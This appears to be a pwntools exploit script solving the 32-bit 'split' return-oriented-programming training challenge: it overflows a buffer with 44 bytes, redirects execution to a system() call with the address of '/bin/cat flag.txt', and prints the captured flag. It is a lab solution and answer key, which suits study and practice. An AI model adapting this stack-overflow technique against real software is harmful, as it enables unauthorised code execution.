from pwn import *

context.arch = "i386"
context.log_level = "critical"

bin = "./split32"
p = process(bin)

p.recvuntil("> ")

payload = [
    b"i"*44,
    p32(0x0804861a), # 0x0804861a <+14>:	call   0x80483e0 <system@plt>
    p32(0x804a030)   # 0x804a030 <usefulString>:	"/bin/cat flag.txt"

]
p.sendline(b"".join(payload))

print(re.search(b"ROPE{(.+?)}", p.recvall()).group(0))
